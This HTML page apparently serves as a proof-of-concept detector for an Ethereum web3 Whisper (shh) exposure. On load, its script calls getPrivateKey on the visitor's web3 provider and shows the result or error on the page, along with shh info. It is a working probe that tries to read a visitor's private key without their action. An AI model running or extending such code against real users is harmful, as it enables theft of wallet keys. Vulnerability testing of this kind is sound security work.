<html>
    <title></title>

    <script type="text/javascript">
        function doCheck() {
            var d = document.getElementById("shh-vulnerability");
            var d2 = document.getElementById("shh-support");

            d.innerHTML = "...";
            d2.innerHTML = "...";

            if (typeof(web3) === "undefined") {
                if (window.web3 != undefined) {
                    web3 = new Web3(window.web3.currentProvider);
                }
            }

            if (typeof(web3) !== "undefined") {
                web3.shh.getPrivateKey('3e22b9ffc2387e18636e0a3d0c56b023264c16e78a2adcba1303cefc685e610f', function(err, value) {
                    if (err) {
                        d.innerHTML = "shh method:" + err;
                    } else {
                        d.innerHTML = "web3 is here!" + value;
                    }
                });
                web3.shh.info(function(e,v) {
                    d2.innerHTML = "shh info " + JSON.stringify(v);
                });

            } else {
                d.innerHTML = "no web3 :(";
            }


        };
    </script>

    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>

    <body>
        <h1 id="shh-vulnerability">detecting...</h1>

        <h1 id="shh-support">detecting...</h1>

        <a href="#" onclick="doCheck();">check again</a>

        <script type="text/javascript">
            window.onload = doCheck;
        </script>
    </body>
</html>
